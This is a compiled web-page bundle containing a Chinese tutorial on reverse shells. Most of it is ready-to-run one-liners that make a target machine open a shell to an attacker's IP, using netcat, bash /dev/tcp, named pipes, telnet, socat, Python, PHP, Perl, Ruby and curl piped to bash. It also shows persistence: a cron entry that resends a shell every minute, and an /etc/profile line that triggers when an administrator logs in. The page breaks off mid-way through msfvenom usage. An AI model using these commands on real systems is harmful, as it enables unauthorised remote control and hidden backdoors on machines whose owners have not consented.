import{_ as t,p as o,q as l,s as a,R as s,t as p,Z as n,n as r}from"./framework-47a2e622.js";const c="/images/image20210424123848.png",i="/images/image20210424124124.png",d="/images/image20210424124222.png",h="/images/image20210424124416.png",u="/images/image20210424124644.png",k="/images/image20210424124731.png",m="/images/image20210424124858.png",g="/images/image20210424125020.png",b="/images/image20210424125155.png",x="/images/image20210424125249.png",v="/images/image20210424125538.png",f="/images/image20210424125600.png",_="/images/image20210424125716.png",w="/images/image20210424125758.png",S="/images/image20210424125827.png",q={},y=a("h2",{id:"正向连接",tabindex:"-1"},[a("a",{class:"header-anchor",href:"#正向连接","aria-hidden":"true"},"#"),s(" 正向连接")],-1),T=a("p",null,"假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标 ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web 服务、ssh、telnet 等等都是正向连接。",-1),L=a("h2",{id:"反向连接",tabindex:"-1"},[a("a",{class:"header-anchor",href:"#反向连接","aria-hidden":"true"},"#"),s(" 反向连接")],-1),P=a("div",{class:"custom-container tip"},[a("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[a("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[a("circle",{cx:"12",cy:"12",r:"9"}),a("path",{d:"M12 8h.01"}),a("path",{d:"M11 12h1v4h1"})])]),a("p",{class:"custom-container-title"},"总结"),a("p",null,"反弹 shell 通常适用于如下几种情况："),a("ul",null,[a("li",null,"目标机因防火墙受限，目标机器只能发送请求，不能接收请求。"),a("li",null,"目标机端口被占用。"),a("li",null,"目标机位于局域网，或IP会动态变化，攻击机无法直接连接。"),a("li",null,"对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的。")])],-1),C=a("p",null,"对于以上几种情况，我们是无法利用正向连接的，要用反向连接。",-1),I=a("blockquote",null,[a("p",null,"那么反向连接就很好理解了，就是攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，即为反向连接。反弹 shell 的方式有很多，那具体要用哪种方式还需要根据目标主机的环境来确定，比如目标主机上如果安装有 netcat，那我们就可以利用 netcat 反弹 shell，如果具有 python 环境，那我们可以利用 python 反弹 shell。如果具有 php 环境，那我们可以利用 php 反弹 shell。")],-1),O=a("h2",{id:"利用-netcat-反弹-shell",tabindex:"-1"},[a("a",{class:"header-anchor",href:"#利用-netcat-反弹-shell","aria-hidden":"true"},"#"),s(" 利用 netcat 反弹 shell")],-1),B=a("p",null,"Netcat 是一款简单的 Unix 工具，使用 UDP 和 TCP 协议。它是一个可靠的容易被其他程序所启用的后台操作工具，同时它也被用作网络的测试工具或黑客工具。使用它你可以轻易的建立任何连接。",-1),M=a("div",{class:"custom-container tip"},[a("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[a("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[a("circle",{cx:"12",cy:"12",r:"9"}),a("path",{d:"M12 8h.01"}),a("path",{d:"M11 12h1v4h1"})])]),a("p",{class:"custom-container-title"},"提示"),a("p",null,"目前，默认的各个 linux 发行版本已经自带了 netcat 工具包，但是可能由于处于安全考虑原生版本的 netcat 带有可以直接发布与反弹本地 shell 的功能参数 -e 都被阉割了，所以我们需要自己手动下载二进制安装包，")],-1),E=n(`<h3 id="安装" tabindex="-1"><a class="header-anchor" href="#安装" aria-hidden="true">#</a> 安装</h3><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">wget</span> https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz
<span class="token function">tar</span> <span class="token parameter variable">-xvzf</span> netcat-0.7.1.tar.gz
./configure
<span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span>
<span class="token function">make</span> clean
</code></pre></div><p>安装完原生版本的 netcat 工具后，便有了<code>netcat -e</code>参数，我们就可以将本地 bash 反弹到攻击机上了。</p><h3 id="攻击机开启本地监听" tabindex="-1"><a class="header-anchor" href="#攻击机开启本地监听" aria-hidden="true">#</a> 攻击机开启本地监听</h3><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>netcat <span class="token parameter variable">-lvvp</span> <span class="token number">2333</span>
</code></pre></div><h3 id="目标机主动连接攻击机" tabindex="-1"><a class="header-anchor" href="#目标机主动连接攻击机" aria-hidden="true">#</a> 目标机主动连接攻击机</h3><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>netcat <span class="token number">47</span>.xxx.xxx.72 <span class="token number">2333</span> <span class="token parameter variable">-e</span> /bin/bash

<span class="token comment"># nc &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e /bin/bash</span>
</code></pre></div><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">rm</span> <span class="token parameter variable">-f</span> /tmp/p<span class="token punctuation">;</span> <span class="token function">mknod</span> /tmp/p p <span class="token operator">&amp;&amp;</span> telnet <span class="token number">192.168</span>.128.128 <span class="token number">9999</span> <span class="token number">0</span>/tmp/p <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
</code></pre></div><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>telnet <span class="token number">192.168</span>.128.128 <span class="token number">9999</span> <span class="token operator">|</span> /bin/bash <span class="token operator">|</span> telnet <span class="token number">192.168</span>.128.128 <span class="token number">9999</span>
</code></pre></div><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">rm</span> f<span class="token punctuation">;</span><span class="token function">mkfifo</span> f<span class="token punctuation">;</span><span class="token function">cat</span> f<span class="token operator">|</span>/bin/sh <span class="token parameter variable">-i</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span><span class="token operator">|</span>telnet <span class="token number">192.168</span>.128.128 <span class="token number">9999</span> <span class="token operator">&gt;</span> f
</code></pre></div><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">rm</span> <span class="token parameter variable">-f</span> x<span class="token punctuation">;</span> <span class="token function">mknod</span> x p <span class="token operator">&amp;&amp;</span> telnet <span class="token number">192.168</span>.128.128 <span class="token number">9999</span> <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>x <span class="token operator">|</span> /bin/bash <span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>x
</code></pre></div><p>执行效果如下：</p><p><img src="`+c+`" alt=""></p><h2 id="利用-bash-反弹-shell" tabindex="-1"><a class="header-anchor" href="#利用-bash-反弹-shell" aria-hidden="true">#</a> 利用 Bash 反弹 shell</h2><h3 id="命令" tabindex="-1"><a class="header-anchor" href="#命令" aria-hidden="true">#</a> 命令</h3><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&gt;&amp;</span> /dev/tcp/47.xxx.xxx.72/2333 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
或
<span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">&quot;bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1&quot;</span>
<span class="token comment"># bash -i &gt;&amp; /dev/tcp/攻击机IP/攻击机端口 0&gt;&amp;1</span>
</code></pre></div>`,16),N=a("div",{class:"custom-container info"},[a("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[a("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[a("circle",{cx:"12",cy:"12",r:"9"}),a("path",{d:"M12 8h.01"}),a("path",{d:"M11 12h1v4h1"})])]),a("p",{class:"custom-container-title"},"解释"),a("p",null,"bash -i 产生一个 bash 交互环境。 &> 和 >& 和 2>&1 是一个意思，都是将标准错误输出合并到标准输出中。 /dev/tcp/ 是 Linux 中的一个特殊设备,打开这个文件就相当于发出了一个 socket 调用，建立一个 socket 连接，读写这个文件就相当于在这个 socket 连接中传输数据。 0>&1 和 0<&1 是将标准输入重定向到标准输出中。")],-1),j=a("div",{class:"custom-container tip"},[a("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[a("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[a("circle",{cx:"12",cy:"12",r:"9"}),a("path",{d:"M12 8h.01"}),a("path",{d:"M11 12h1v4h1"})])]),a("p",{class:"custom-container-title"},"补充"),a("ul",null,[a("li",null,">&：将联合符号前面的内容与后面相结合，然后一起重定向给后者。"),a("li",null,"/dev/tcp/47.xxx.xxx.72/2333：Linux 环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机 47.xxx.xxx.72 的 2333 端口建立一个 tcp 连接。"),a("li",null,"0>&1：将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。")]),a("p",null,"Bash 反弹一句完整的解读过程就是："),a("p",null,"Bash 产生了一个交互环境和本地主机主动发起与攻击机 2333 端口建立的连接（即 TCP 2333会话连接）相结合，然后在重定向个 TCP 2333 会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个 Bash 反弹环境。")],-1),D=n(`<h3 id="攻击机开启本地监听-1" tabindex="-1"><a class="header-anchor" href="#攻击机开启本地监听-1" aria-hidden="true">#</a> 攻击机开启本地监听</h3><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-lvvp</span> <span class="token number">2333</span>
</code></pre></div><h3 id="目标机主动连接攻击机-1" tabindex="-1"><a class="header-anchor" href="#目标机主动连接攻击机-1" aria-hidden="true">#</a> 目标机主动连接攻击机</h3><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&gt;&amp;</span> /dev/tcp/47.xxx.xxx.72/2333 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
</code></pre></div><h3 id="tcp-协议-shell" tabindex="-1"><a class="header-anchor" href="#tcp-协议-shell" aria-hidden="true">#</a> TCP 协议 shell</h3><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&gt;&amp;</span> /dev/tcp/192.168.128.128/9999 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
</code></pre></div><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>/bin/bash <span class="token parameter variable">-i</span> <span class="token operator">&gt;</span> /dev/tcp/192.168.128.128/9999 <span class="token operator"><span class="token file-descriptor important">0</span>&lt;&amp;</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
</code></pre></div><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">5</span>&lt;&gt;</span>/dev/tcp/192.168.128.128/9999<span class="token punctuation">;</span><span class="token function">cat</span> <span class="token operator">&lt;</span><span class="token file-descriptor important">&amp;5</span> <span class="token operator">|</span> <span class="token keyword">while</span> <span class="token builtin class-name">read</span> line<span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token variable">$line</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;5</span> <span class="token operator">&gt;</span><span class="token file-descriptor important">&amp;5</span><span class="token punctuation">;</span> <span class="token keyword">done</span>
</code></pre></div><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token builtin class-name">exec</span> /bin/sh <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>/dev/tcp/192.168.128.128/9999 <span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span><span class="token file-descriptor important">&amp;0</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;0</span>
</code></pre></div><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token operator"><span class="token file-descriptor important">0</span>&lt;&amp;</span><span class="token number">196</span><span class="token punctuation">;</span><span class="token builtin class-name">exec</span> <span class="token number">19</span><span class="token operator"><span class="token file-descriptor important">6</span>&lt;&gt;</span>/dev/tcp/192.168.128.128/9999<span class="token punctuation">;</span> <span class="token function">sh</span> <span class="token operator">&lt;&amp;</span><span class="token number">196</span> <span class="token operator">&gt;&amp;</span><span class="token number">196</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;&amp;</span><span class="token number">196</span>
</code></pre></div><h3 id="udp-协议-shell" tabindex="-1"><a class="header-anchor" href="#udp-协议-shell" aria-hidden="true">#</a> UDP 协议 shell</h3><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-e</span> /bin/sh <span class="token number">192.168</span>.128.128 <span class="token number">9999</span>
</code></pre></div><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-e</span> /bin/bash <span class="token number">192.168</span>.128.128 <span class="token number">9999</span>
</code></pre></div><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-c</span> <span class="token function">bash</span> <span class="token number">192.168</span>.128.128 <span class="token number">9999</span>
</code></pre></div><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">mknod</span> backpipe p <span class="token operator">&amp;&amp;</span> <span class="token function">nc</span> <span class="token number">192.168</span>.128.128 <span class="token number">9999</span> <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>backpipe <span class="token operator">|</span> /bin/bash <span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>backpipe 
</code></pre></div><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">rm</span> /tmp/f<span class="token punctuation">;</span><span class="token function">mkfifo</span> /tmp/f<span class="token punctuation">;</span><span class="token function">cat</span> /tmp/f<span class="token operator">|</span>/bin/sh <span class="token parameter variable">-i</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span><span class="token operator">|</span><span class="token function">nc</span> <span class="token number">192.168</span>.128.128 <span class="token number">9999</span> <span class="token operator">&gt;</span>/tmp/f
</code></pre></div><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">rm</span> <span class="token parameter variable">-f</span> /tmp/p<span class="token punctuation">;</span> <span class="token function">mknod</span> /tmp/p p <span class="token operator">&amp;&amp;</span> <span class="token function">nc</span> <span class="token number">192.168</span>.128.128 <span class="token number">9999</span> <span class="token number">0</span>/tmp/p <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
</code></pre></div><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">rm</span> f<span class="token punctuation">;</span><span class="token function">mkfifo</span> f<span class="token punctuation">;</span><span class="token function">cat</span> f<span class="token operator">|</span>/bin/sh <span class="token parameter variable">-i</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span><span class="token operator">|</span><span class="token function">nc</span> <span class="token number">192.168</span>.128.128 <span class="token number">9999</span> <span class="token operator">&gt;</span> f
</code></pre></div><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">rm</span> <span class="token parameter variable">-f</span> x<span class="token punctuation">;</span> <span class="token function">mknod</span> x p <span class="token operator">&amp;&amp;</span> <span class="token function">nc</span> <span class="token number">192.168</span>.128.128 <span class="token number">9999</span> <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>x <span class="token operator">|</span> /bin/bash <span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>x
</code></pre></div><p>执行效果如下：</p><p><img src="`+i+`" alt=""></p><h2 id="curl-配合-bash-反弹-shell" tabindex="-1"><a class="header-anchor" href="#curl-配合-bash-反弹-shell" aria-hidden="true">#</a> Curl 配合 Bash 反弹 shell</h2><blockquote><p>这里操作也很简单，借助了 Linux 中的管道。</p></blockquote><p>首先，在攻击者 vps 的 web 目录里面创建一个 index 文件（index.php 或 index.html），内容如下：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&gt;&amp;</span> /dev/tcp/47.xxx.xxx.72/2333 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
</code></pre></div><p>并开启 2333 端口的监听。</p><p>然后再目标机上执行如下，即可反弹 shell：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">curl</span> <span class="token number">47</span>.xxx.xxx.72<span class="token operator">|</span><span class="token function">bash</span>
</code></pre></div><p>执行效果如下：</p><p><img src="`+d+`" alt=""></p><p>根据 curl 命令和 Linux 管道的作用，你不难理解这其中的原理。</p><p>Curl 配合 Bash 反弹 shell 的方式在 CTF 题目中经常出现，<code>curl IP|bash</code> 中的 IP 可以是任意格式的，可以是十进制、十六进制、八进制、二进制等等。</p><p>将反弹 shell 的命令写入定时任务</p><p>我们可以在目标主机的定时任务文件中写入一个反弹 shell 的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹shell命令是要写在<code> /var/spool/cron/[crontabs]/&lt;username&gt;</code> 内的，所以必须要知道远程主机当前的用户名。否则就不能生效。</p><p>比如，当前用户名为 root，我们就要将下面内容写入到 <code>/var/spool/cron/root</code> 中。(centos 系列主机)</p><p>比如，当前用户名为 root，我们就要将下面内容写入到 <code>/var/spool/cron/crontabs/root</code> 中。(Debian/Ubuntu 系列主机)</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>*/1  *  *  *  *   /bin/bash -i<span class="token operator">&gt;&amp;</span>/dev/tcp/47.xxx.xxx.72/2333 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
<span class="token comment">#每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell</span>
</code></pre></div><p>将以下反弹 shell 的命写入 /etc/profile 文件中，/etc/profile 中的内容会在用户打开 bash 窗口时执行。</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>/bin/bash <span class="token parameter variable">-i</span> <span class="token operator">&gt;&amp;</span> /dev/tcp/47.xxx.xxx.72/2333 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span>
<span class="token comment"># 最后面那个&amp;为的是防止管理员无法输入命令</span>
</code></pre></div><p>当目标主机管理员远程连接该主机时，就会执行该命令，成功获得目标机的 shell：</p><p><img src="`+h+'" alt=""></p><h2 id="利用-socat-反弹-shell" tabindex="-1"><a class="header-anchor" href="#利用-socat-反弹-shell" aria-hidden="true">#</a> 利用 Socat 反弹 shell</h2>',42),R={href:"http://brieflyx.me/2015/linux-tools/socat-introduction/",target:"_blank",rel:"noopener noreferrer"},U=a("p",null,"安装Socat的方法很简单：",-1),$=a("li",null,[s("Ubuntu等可以直接使用 "),a("code",null,"apt-get install socat"),s(" 命令进行安装")],-1),A={href:"http://www.dest-unreach.org/socat",target:"_blank",rel:"noopener noreferrer"},F=n(`<h3 id="攻击机开启本地监听-2" tabindex="-1"><a class="header-anchor" href="#攻击机开启本地监听-2" aria-hidden="true">#</a> 攻击机开启本地监听</h3><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>socat TCP-LISTEN:2333 -
或
<span class="token function">nc</span> <span class="token parameter variable">-lvvp</span> <span class="token number">2333</span>
</code></pre></div><h3 id="目标机主动连接攻击机-2" tabindex="-1"><a class="header-anchor" href="#目标机主动连接攻击机-2" aria-hidden="true">#</a> 目标机主动连接攻击机</h3><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>socat tcp-connect:47.xxx.xxx.72:2333 exec:<span class="token string">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane
</code></pre></div><p>执行效果如下：</p><p><img src="`+u+`" alt=""></p><h2 id="利用-telnet-反弹-shell" tabindex="-1"><a class="header-anchor" href="#利用-telnet-反弹-shell" aria-hidden="true">#</a> 利用 Telnet 反弹 shell</h2><p>当 nc 和 /dev/tcp 不可用，且目标主机和攻击机上支持 Telnet 服务时，我们可以使用 Telnet 反弹 shell。</p><p>方法一：</p><h3 id="攻击机开启本地监听-3" tabindex="-1"><a class="header-anchor" href="#攻击机开启本地监听-3" aria-hidden="true">#</a> 攻击机开启本地监听</h3><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-lvvp</span> <span class="token number">2333</span>
</code></pre></div><h3 id="目标机主动连接攻击机-3" tabindex="-1"><a class="header-anchor" href="#目标机主动连接攻击机-3" aria-hidden="true">#</a> 目标机主动连接攻击机</h3><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">mknod</span> a p<span class="token punctuation">;</span> telnet <span class="token number">47</span>.xxx.xxx.72 <span class="token number">2333</span> <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>a <span class="token operator">|</span> /bin/bash <span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>a
</code></pre></div><p>执行效果如下：</p><p><img src="`+k+`" alt=""></p><p>方法二：</p><h3 id="攻击机需要开启两个本地监听" tabindex="-1"><a class="header-anchor" href="#攻击机需要开启两个本地监听" aria-hidden="true">#</a> 攻击机需要开启两个本地监听</h3><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-lvvp</span> <span class="token number">2333</span>
<span class="token function">nc</span> <span class="token parameter variable">-lvvp</span> <span class="token number">4000</span>
</code></pre></div><h3 id="目标机主动连接攻击机-4" tabindex="-1"><a class="header-anchor" href="#目标机主动连接攻击机-4" aria-hidden="true">#</a> 目标机主动连接攻击机</h3><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>telnet <span class="token number">47.101</span>.57.72 <span class="token number">2333</span> <span class="token operator">|</span> /bin/bash <span class="token operator">|</span> telnet <span class="token number">47.101</span>.57.72 <span class="token number">4000</span>
</code></pre></div><p>执行效果如下：</p><p><img src="`+m+`" alt=""></p><h2 id="各种脚本反弹-shell" tabindex="-1"><a class="header-anchor" href="#各种脚本反弹-shell" aria-hidden="true">#</a> 各种脚本反弹 shell</h2><h3 id="python-脚本反弹shell" tabindex="-1"><a class="header-anchor" href="#python-脚本反弹shell" aria-hidden="true">#</a> Python 脚本反弹shell</h3><p>当目标主机上有 python 环境时，我们可以用 Python 来反弹 shell。Python 在现在一般发行版 Linux 系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。</p><h4 id="攻击机开启本地监听-4" tabindex="-1"><a class="header-anchor" href="#攻击机开启本地监听-4" aria-hidden="true">#</a> 攻击机开启本地监听</h4><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-lvvp</span> <span class="token number">2333</span>
</code></pre></div><h4 id="目标机主动连接攻击机-5" tabindex="-1"><a class="header-anchor" href="#目标机主动连接攻击机-5" aria-hidden="true">#</a> 目标机主动连接攻击机</h4><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>python <span class="token parameter variable">-c</span> <span class="token string">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;47.xxx.xxx.72&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</span>
</code></pre></div><p>执行效果如下：</p><p><img src="`+g+`" alt=""></p><h3 id="php-脚本反弹shell" tabindex="-1"><a class="header-anchor" href="#php-脚本反弹shell" aria-hidden="true">#</a> php 脚本反弹shell</h3><p>当目标主机上有 php 环境时，我们可以用 php 来反弹 shell。</p><h4 id="攻击机开启本地监听-5" tabindex="-1"><a class="header-anchor" href="#攻击机开启本地监听-5" aria-hidden="true">#</a> 攻击机开启本地监听</h4><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-lvvp</span> <span class="token number">2333</span>
</code></pre></div><h4 id="目标机主动连接攻击机-6" tabindex="-1"><a class="header-anchor" href="#目标机主动连接攻击机-6" aria-hidden="true">#</a> 目标机主动连接攻击机</h4><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>php <span class="token parameter variable">-r</span> <span class="token string">&#39;$sock=fsockopen(&quot;47.xxx.xxx.72&quot;,2333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span>
</code></pre></div><h3 id="perl-脚本反弹shell" tabindex="-1"><a class="header-anchor" href="#perl-脚本反弹shell" aria-hidden="true">#</a> Perl 脚本反弹shell</h3><p>当目标主机上有 perl 环境时，我们可以用 perl 来反弹 shell。</p><h4 id="攻击机开启本地监听-6" tabindex="-1"><a class="header-anchor" href="#攻击机开启本地监听-6" aria-hidden="true">#</a> 攻击机开启本地监听</h4><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-lvvp</span> <span class="token number">2333</span>
</code></pre></div><h4 id="目标机主动连接攻击机-7" tabindex="-1"><a class="header-anchor" href="#目标机主动连接攻击机-7" aria-hidden="true">#</a> 目标机主动连接攻击机</h4><div class="language-text" data-ext="text"><pre class="language-text"><code>perl -e &#39;use Socket;$i=&quot;47.101.57.72&quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;
</code></pre></div><p>执行效果如下：</p><p><img src="`+b+`" alt=""></p><h3 id="ruby脚本反弹shel" tabindex="-1"><a class="header-anchor" href="#ruby脚本反弹shel" aria-hidden="true">#</a> Ruby脚本反弹shel</h3><p>当目标主机上有 ruby 环境时，我们可以用 ruby 来反弹 shell。</p><h4 id="攻击机开启本地监听-7" tabindex="-1"><a class="header-anchor" href="#攻击机开启本地监听-7" aria-hidden="true">#</a> 攻击机开启本地监听</h4><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-lvvp</span> <span class="token number">2333</span>
</code></pre></div><h4 id="目标机主动连接攻击机-8" tabindex="-1"><a class="header-anchor" href="#目标机主动连接攻击机-8" aria-hidden="true">#</a> 目标机主动连接攻击机</h4><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>ruby <span class="token parameter variable">-rsocket</span> <span class="token parameter variable">-e</span> <span class="token string">&#39;c=TCPSocket.new(&quot;47.xxx.xxx.72&quot;,&quot;2333&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;</span>
或
ruby <span class="token parameter variable">-rsocket</span> <span class="token parameter variable">-e</span> <span class="token string">&#39;exit if fork;c=TCPSocket.new(&quot;47.xxx.xxx.72&quot;,&quot;2333&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;</span>
</code></pre></div><p>执行效果如下：</p><p><img src="`+x+`" alt=""></p><h3 id="使用-metasploit-生成反弹-shell" tabindex="-1"><a class="header-anchor" href="#使用-metasploit-生成反弹-shell" aria-hidden="true">#</a> 使用 Metasploit 生成反弹 shell</h3><p>强大的 Metasploit 框架也为我们提供了生成一句话反弹 shell 的工具，即 msfvenom，绝对的实用。当我们不记得前面说的所有反弹shell的反弹语句时，只要我们有 Metasploit，那么我们随时都可以使用 <code>msfvenom -l</code> 来查询生成我们所需要的各类命令行一句话，具体使用方法如下。</p><p>我们直接可以使用 <code>msfvenom -l</code> 结合关键字过滤（如cmd/unix/reverse），列出我们需要生成的各类反弹shell一句话的payload：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>msfvenom <span class="token parameter variable">-l</span> payloads <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">&#39;cmd/unix/reverse&#39;</span>
